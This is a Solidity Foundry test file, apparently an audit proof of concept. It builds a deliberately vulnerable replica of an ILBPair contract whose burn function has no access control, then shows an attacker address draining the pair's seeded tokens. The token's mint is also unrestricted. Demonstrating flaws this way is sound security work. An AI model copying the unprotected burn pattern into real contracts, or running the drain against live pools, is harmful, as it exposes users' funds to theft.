// Minimal ERC20 used only for the PoC
contract SimpleERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Minimal vulnerable replica (only the pieces we touch)
contract ILBPair {
    address public tokenX;
    address public tokenY;

    constructor(address _x, address _y) {
        tokenX = _x;
        tokenY = _y;
    }

    // Vulnerable: no access control, anyone can call and redirect assets to `to`
    function burn(
        uint256[] memory ids,
        uint256[] memory amounts,
        address to
    ) external returns (uint256 amountX, uint256 amountY) {
        // minimal logic: take first two amounts and transfer tokens to `to`
        require(amounts.length >= 2, "bad lengths");
        amountX = amounts[0];
        amountY = amounts[1];

        // perform transfers from this contract's balance to `to` — no access control
        SimpleERC20(tokenX).transfer(to, amountX);
        SimpleERC20(tokenY).transfer(to, amountY);
    }
}

contract ILBPairTest is Test {
    ILBPair target;
    SimpleERC20 tokenX;
    SimpleERC20 tokenY;
    address attacker;

    function setUp() public {
        tokenX = new SimpleERC20();
        tokenY = new SimpleERC20();
        target = new ILBPair(address(tokenX), address(tokenY));
        attacker = makeAddr("attacker");

        // seed the pair with tokens that should only be redeemable by authorized parties
        tokenX.mint(address(target), 100);
        tokenY.mint(address(target), 200);
    }

    function test_attacker_exploits_burn() public {
        // attacker calls burn and withdraws tokens to themselves
        vm.prank(attacker);
        uint256[] memory ids = new uint256[](1);
        ids[0] = 1;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100;
        amounts[1] = 200;

        target.burn(ids, amounts, attacker);

        // attacker received the tokens — demonstrates missing access control
        assertEq(tokenX.balanceOf(attacker), 100);
        assertEq(tokenY.balanceOf(attacker), 200);
    }
}

